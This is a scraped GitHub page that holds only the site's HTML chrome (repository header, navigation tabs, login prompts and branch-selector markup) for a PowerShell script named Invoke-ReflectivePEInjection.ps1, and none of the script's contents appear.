    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
    
    <span class="author flex-self-stretch" itemprop="author">
      <a class="url fn" rel="author" data-hovercard-type="user" data-hovercard-url="/users/clymb3r/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/clymb3r">
        clymb3r
</a>    </span>
    <span class="mx-1 flex-self-stretch color-fg-muted">/</span>
    <strong itemprop="name" class="mr-2 flex-self-stretch">
      <a data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" href="/clymb3r/PowerShell">PowerShell</a>
    </strong>

    <span></span><span class="Label Label--secondary v-align-middle mr-1">Public</span>
  </div>


        </div>

        <div id="repository-details-container" data-turbo-replace>
            <ul class="pagehead-actions flex-shrink-0 d-none d-md-inline" style="padding: 2px 0;">
    
      

  <li>
            <a href="/login?return_to=%2Fclymb3r%2FPowerShell" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;notification subscription menu watch&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="e9fb14865ab4ef7c7d132a4b32f8405f1f98354568eec4b17570c5a12487def1" aria-label="You must be signed in to change notification settings" data-view-component="true" class="tooltipped tooltipped-s btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bell mr-2">
    <path d="M8 16a2 2 0 0 0 1.985-1.75c.017-.137-.097-.25-.235-.25h-3.5c-.138 0-.252.113-.235.25A2 2 0 0 0 8 16ZM3 5a5 5 0 0 1 10 0v2.947c0 .05.015.098.042.139l1.703 2.555A1.519 1.519 0 0 1 13.482 13H2.518a1.516 1.516 0 0 1-1.263-2.36l1.703-2.554A.255.255 0 0 0 3 7.947Zm5-3.5A3.5 3.5 0 0 0 4.5 5v2.947c0 .346-.102.683-.294.97l-1.703 2.556a.017.017 0 0 0-.003.01l.001.006c0 .002.002.004.004.006l.006.004.007.001h10.964l.007-.001.006-.004.004-.006.001-.007a.017.017 0 0 0-.003-.01l-1.703-2.554a1.745 1.745 0 0 1-.294-.97V5A3.5 3.5 0 0 0 8 1.5Z"></path>
</svg>Notifications
</a>  </li>

  <li>
          <a icon="repo-forked" id="fork-button" href="/login?return_to=%2Fclymb3r%2FPowerShell" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;repo details fork button&quot;,&quot;repository_id&quot;:9093330,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="3398e751ebb87b18eaf91217d54505a2e6775a844aa6ecc2c9486309ed63f7b8" data-view-component="true" class="btn-sm btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo-forked mr-2">
    <path d="M5 5.372v.878c0 .414.336.75.75.75h4.5a.75.75 0 0 0 .75-.75v-.878a2.25 2.25 0 1 1 1.5 0v.878a2.25 2.25 0 0 1-2.25 2.25h-1.5v2.128a2.251 2.251 0 1 1-1.5 0V8.5h-1.5A2.25 2.25 0 0 1 3.5 6.25v-.878a2.25 2.25 0 1 1 1.5 0ZM5 3.25a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Zm6.75.75a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm-3 8.75a.75.75 0 1 0-1.5 0 .75.75 0 0 0 1.5 0Z"></path>
</svg>Fork
    <span id="repo-network-counter" data-pjax-replace="true" data-turbo-replace="true" title="543" data-view-component="true" class="Counter">543</span>
</a>
  </li>

  <li>
        <div data-view-component="true" class="BtnGroup d-flex">
        <a href="/login?return_to=%2Fclymb3r%2FPowerShell" rel="nofollow" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;star button&quot;,&quot;repository_id&quot;:9093330,&quot;auth_type&quot;:&quot;LOG_IN&quot;,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="eff8f1e0f059cd888df3b5bd41750a3d5e26d7879c39f5a2acca8017e697c45a" aria-label="You must be signed in to star a repository" data-view-component="true" class="tooltipped tooltipped-s btn-sm btn BtnGroup-item">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-star v-align-text-bottom d-inline-block mr-2">
    <path d="M8 .25a.75.75 0 0 1 .673.418l1.882 3.815 4.21.612a.75.75 0 0 1 .416 1.279l-3.046 2.97.719 4.192a.751.751 0 0 1-1.088.791L8 12.347l-3.766 1.98a.75.75 0 0 1-1.088-.79l.72-4.194L.818 6.374a.75.75 0 0 1 .416-1.28l4.21-.611L7.327.668A.75.75 0 0 1 8 .25Zm0 2.445L6.615 5.5a.75.75 0 0 1-.564.41l-3.097.45 2.24 2.184a.75.75 0 0 1 .216.664l-.528 3.084 2.769-1.456a.75.75 0 0 1 .698 0l2.77 1.456-.53-3.084a.75.75 0 0 1 .216-.664l2.24-2.183-3.096-.45a.75.75 0 0 1-.564-.41L8 2.694Z"></path>
</svg><span data-view-component="true" class="d-inline">
          Star
</span>          <span id="repo-stars-counter-star" aria-label="1084 users starred this repository" data-singular-suffix="user starred this repository" data-plural-suffix="users starred this repository" data-turbo-replace="true" title="1,084" data-view-component="true" class="Counter js-social-count">1.1k</span>
</a>        <button disabled="disabled" aria-label="You must be signed in to add this repository to a list" type="button" data-view-component="true" class="btn-sm btn BtnGroup-item px-2">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
</button></div>
  </li>


    

</ul>

        </div>
      </div>

        <div id="responsive-meta-container" data-turbo-replace>
</div>


          <nav data-pjax="#js-repo-pjax-container" aria-label="Repository" data-view-component="true" class="js-repo-nav js-sidenav-container-pjax js-responsive-underlinenav overflow-hidden UnderlineNav px-3 px-md-4 px-lg-5">

  <ul data-view-component="true" class="UnderlineNav-body list-style-none">
      <li data-view-component="true" class="d-inline-flex">
  <a id="code-tab" href="/clymb3r/PowerShell" data-tab-item="i0code-tab" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages repo_deployments /clymb3r/PowerShell" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g c" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Code&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" aria-current="page" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item selected">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code UnderlineNav-octicon d-none d-sm-inline">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
        <span data-content="Code">Code</span>
          <span id="code-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="issues-tab" href="/clymb3r/PowerShell/issues" data-tab-item="i1issues-tab" data-selected-links="repo_issues repo_labels repo_milestones /clymb3r/PowerShell/issues" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g i" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Issues&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-issue-opened UnderlineNav-octicon d-none d-sm-inline">
    <path d="M8 9.5a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Z"></path>
</svg>
        <span data-content="Issues">Issues</span>
          <span id="issues-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="9" data-view-component="true" class="Counter">9</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="pull-requests-tab" href="/clymb3r/PowerShell/pulls" data-tab-item="i2pull-requests-tab" data-selected-links="repo_pulls checks /clymb3r/PowerShell/pulls" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g p" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Pull requests&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-pull-request UnderlineNav-octicon d-none d-sm-inline">
    <path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354ZM3.75 2.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm0 9.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm8.25.75a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Z"></path>
</svg>
        <span data-content="Pull requests">Pull requests</span>
          <span id="pull-requests-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="actions-tab" href="/clymb3r/PowerShell/actions" data-tab-item="i3actions-tab" data-selected-links="repo_actions /clymb3r/PowerShell/actions" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g a" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Actions&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play UnderlineNav-octicon d-none d-sm-inline">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
        <span data-content="Actions">Actions</span>
          <span id="actions-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="projects-tab" href="/clymb3r/PowerShell/projects" data-tab-item="i4projects-tab" data-selected-links="repo_projects new_repo_project repo_project /clymb3r/PowerShell/projects" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g b" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Projects&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table UnderlineNav-octicon d-none d-sm-inline">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25ZM6.5 6.5v8h7.75a.25.25 0 0 0 .25-.25V6.5Zm8-1.5V1.75a.25.25 0 0 0-.25-.25H6.5V5Zm-13 1.5v7.75c0 .138.112.25.25.25H5v-8ZM5 5V1.5H1.75a.25.25 0 0 0-.25.25V5Z"></path>
</svg>
        <span data-content="Projects">Projects</span>
          <span id="projects-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="0" hidden="hidden" data-view-component="true" class="Counter">0</span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="wiki-tab" href="/clymb3r/PowerShell/wiki" data-tab-item="i5wiki-tab" data-selected-links="repo_wiki /clymb3r/PowerShell/wiki" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g w" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Wiki&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book UnderlineNav-octicon d-none d-sm-inline">
    <path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path>
</svg>
        <span data-content="Wiki">Wiki</span>
          <span id="wiki-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="security-tab" href="/clymb3r/PowerShell/security" data-tab-item="i6security-tab" data-selected-links="security overview alerts policy token_scanning code_scanning /clymb3r/PowerShell/security" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-hotkey="g s" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Security&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield UnderlineNav-octicon d-none d-sm-inline">
    <path d="M7.467.133a1.748 1.748 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM8.75 4.75v3a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0ZM9 10.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        <span data-content="Security">Security</span>
          <include-fragment src="/clymb3r/PowerShell/security/overall-count" accept="text/fragment+html"></include-fragment>

    
</a></li>
      <li data-view-component="true" class="d-inline-flex">
  <a id="insights-tab" href="/clymb3r/PowerShell/pulse" data-tab-item="i7insights-tab" data-selected-links="repo_graphs repo_contributors dependency_graph dependabot_updates pulse people community /clymb3r/PowerShell/pulse" data-pjax="#repo-content-pjax-container" data-turbo-frame="repo-content-turbo-frame" data-analytics-event="{&quot;category&quot;:&quot;Underline navbar&quot;,&quot;action&quot;:&quot;Click tab&quot;,&quot;label&quot;:&quot;Insights&quot;,&quot;target&quot;:&quot;UNDERLINE_NAV.TAB&quot;}" data-view-component="true" class="UnderlineNav-item no-wrap js-responsive-underlinenav-item js-selected-navigation-item">
    
              <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph UnderlineNav-octicon d-none d-sm-inline">
    <path d="M1.5 1.75V13.5h13.75a.75.75 0 0 1 0 1.5H.75a.75.75 0 0 1-.75-.75V1.75a.75.75 0 0 1 1.5 0Zm14.28 2.53-5.25 5.25a.75.75 0 0 1-1.06 0L7 7.06 4.28 9.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.25-3.25a.75.75 0 0 1 1.06 0L10 7.94l4.72-4.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
        <span data-content="Insights">Insights</span>
          <span id="insights-repo-tab-count" data-pjax-replace="" data-turbo-replace="" title="Not available" data-view-component="true" class="Counter"></span>


    
</a></li>
</ul>
    <div style="visibility:hidden;" data-view-component="true" class="UnderlineNav-actions js-responsive-underlinenav-overflow position-absolute pr-3 pr-md-4 pr-lg-5 right-0">      <details data-view-component="true" class="details-overlay details-reset position-relative">
  <summary role="button" data-view-component="true">          <div class="UnderlineNav-item mr-0 border-0">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
            <span class="sr-only">More</span>
          </div>
</summary>
  <details-menu role="menu" data-view-component="true" class="dropdown-menu dropdown-menu-sw">          <ul>
              <li data-menu-item="i0code-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item selected dropdown-item" aria-current="page" data-selected-links="repo_source repo_downloads repo_commits repo_releases repo_tags repo_branches repo_packages repo_deployments /clymb3r/PowerShell" href="/clymb3r/PowerShell">
                  Code
</a>              </li>
              <li data-menu-item="i1issues-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="repo_issues repo_labels repo_milestones /clymb3r/PowerShell/issues" href="/clymb3r/PowerShell/issues">
                  Issues
</a>              </li>
              <li data-menu-item="i2pull-requests-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="repo_pulls checks /clymb3r/PowerShell/pulls" href="/clymb3r/PowerShell/pulls">
                  Pull requests
</a>              </li>
              <li data-menu-item="i3actions-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="repo_actions /clymb3r/PowerShell/actions" href="/clymb3r/PowerShell/actions">
                  Actions
</a>              </li>
              <li data-menu-item="i4projects-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="repo_projects new_repo_project repo_project /clymb3r/PowerShell/projects" href="/clymb3r/PowerShell/projects">
                  Projects
</a>              </li>
              <li data-menu-item="i5wiki-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="repo_wiki /clymb3r/PowerShell/wiki" href="/clymb3r/PowerShell/wiki">
                  Wiki
</a>              </li>
              <li data-menu-item="i6security-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="security overview alerts policy token_scanning code_scanning /clymb3r/PowerShell/security" href="/clymb3r/PowerShell/security">
                  Security
</a>              </li>
              <li data-menu-item="i7insights-tab" hidden>
                <a role="menuitem" class="js-selected-navigation-item dropdown-item" data-selected-links="repo_graphs repo_contributors dependency_graph dependabot_updates pulse people community /clymb3r/PowerShell/pulse" href="/clymb3r/PowerShell/pulse">
                  Insights
</a>              </li>
          </ul>
</details-menu>
</details></div>
</nav>

  </div>

  



<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
    <div id="repo-content-pjax-container" class="repository-content " >
    


    
      
  <div class="clearfix container-xl px-3 px-md-4 px-lg-5 mt-4">
    
    
<div >
  

  



    
<a class="d-none js-permalink-shortcut" data-hotkey="y" href="/clymb3r/PowerShell/blob/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">Permalink</a>

<div class="d-flex flex-items-start flex-shrink-0 pb-3 flex-wrap flex-md-nowrap flex-justify-between flex-md-justify-start">
  
<div class="position-relative">
  <details
    class="js-branch-select-menu details-reset details-overlay mr-0 mb-0 "
    id="branch-select-menu"
    data-hydro-click-payload="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;REFS_SELECTOR_MENU&quot;,&quot;repository_id&quot;:9093330,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="50f6344a7e2c3dcb057bc8d9dbf0a42ce42afce57f5073ebd7b72a1312984029">
    <summary class="btn css-truncate"
            data-hotkey="w"
            title="Switch branches or tags">
      <svg text="gray" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-git-branch">
    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.493 2.493 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z"></path>
</svg>
      <span class="css-truncate-target" data-menu-button>master</span>
      <span class="dropdown-caret"></span>
    </summary>

    
<div class="SelectMenu">
  <div class="SelectMenu-modal">
    <header class="SelectMenu-header">
      <span class="SelectMenu-title">Switch branches/tags</span>
      <button class="SelectMenu-closeButton" type="button" data-toggle-for="branch-select-menu"><svg aria-label="Close menu" aria-hidden="false" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg></button>
    </header>

    <input-demux data-action="tab-container-change:input-demux#storeInput tab-container-changed:input-demux#updateInput">
      <tab-container class="d-flex flex-column js-branches-tags-tabs" style="min-height: 0;">
        <div class="SelectMenu-filter">
          <input data-target="input-demux.source"
                 id="context-commitish-filter-field"
                 class="SelectMenu-input form-control"
                 aria-owns="ref-list-branches"
                 data-controls-ref-menu-id="ref-list-branches"
                 autofocus
                 autocomplete="off"
                 aria-label="Filter branches/tags"
                 placeholder="Filter branches/tags"
                 type="text"
          >
        </div>

        <div class="SelectMenu-tabs" role="tablist" data-target="input-demux.control" >
          <button class="SelectMenu-tab" type="button" role="tab" aria-selected="true">Branches</button>
          <button class="SelectMenu-tab" type="button" role="tab">Tags</button>
        </div>

        <div role="tabpanel" id="ref-list-branches" data-filter-placeholder="Filter branches/tags" tabindex="" class="d-flex flex-column flex-auto overflow-auto">
          <ref-selector
            type="branch"
            data-targets="input-demux.sinks"
            data-action="
              input-entered:ref-selector#inputEntered
              tab-selected:ref-selector#tabSelected
              focus-list:ref-selector#focusFirstListMember
            "
            query-endpoint="/clymb3r/PowerShell/refs"
            
            cache-key="v0:1613517882.4893298"
            current-committish="bWFzdGVy"
            default-branch="bWFzdGVy"
            name-with-owner="Y2x5bWIzci9Qb3dlclNoZWxs"
            prefetch-on-mouseover
          >

            <template data-target="ref-selector.fetchFailedTemplate">
              <div class="SelectMenu-message" data-index="{{ index }}">Could not load branches</div>
            </template>

              <template data-target="ref-selector.noMatchTemplate">
    <div class="SelectMenu-message">Nothing to show</div>
</template>


            <div data-target="ref-selector.listContainer" role="menu" class="SelectMenu-list " data-turbo-frame="repo-content-turbo-frame">
              <div class="SelectMenu-loading pt-3 pb-0 overflow-hidden" aria-label="Menu is loading">
                <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" data-view-component="true" class="anim-rotate">
  <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" />
  <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>
              </div>
            </div>

              

<template data-target="ref-selector.itemTemplate">
  <a href="https://github.com/clymb3r/PowerShell/blob/{{ urlEncodedRefName }}/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" class="SelectMenu-item" role="menuitemradio" rel="nofollow" aria-checked="{{ isCurrent }}" data-index="{{ index }}" >
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check SelectMenu-icon SelectMenu-icon--check">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    <span class="flex-1 css-truncate css-truncate-overflow {{ isFilteringClass }}">{{ refName }}</span>
    <span hidden="{{ isNotDefault }}" class="Label Label--secondary flex-self-start">default</span>
  </a>
</template>


              <footer class="SelectMenu-footer"><a href="/clymb3r/PowerShell/branches">View all branches</a></footer>
          </ref-selector>

        </div>

        <div role="tabpanel" id="tags-menu" data-filter-placeholder="Find a tag" tabindex="" hidden class="d-flex flex-column flex-auto overflow-auto">
          <ref-selector
            type="tag"
            data-action="
              input-entered:ref-selector#inputEntered
              tab-selected:ref-selector#tabSelected
              focus-list:ref-selector#focusFirstListMember
            "
            data-targets="input-demux.sinks"
            query-endpoint="/clymb3r/PowerShell/refs"
            cache-key="v0:1613517882.4893298"
            current-committish="bWFzdGVy"
            default-branch="bWFzdGVy"
            name-with-owner="Y2x5bWIzci9Qb3dlclNoZWxs"
          >

            <template data-target="ref-selector.fetchFailedTemplate">
              <div class="SelectMenu-message" data-index="{{ index }}">Could not load tags</div>
            </template>

            <template data-target="ref-selector.noMatchTemplate">
              <div class="SelectMenu-message" data-index="{{ index }}">Nothing to show</div>
            </template>

              

<template data-target="ref-selector.itemTemplate">
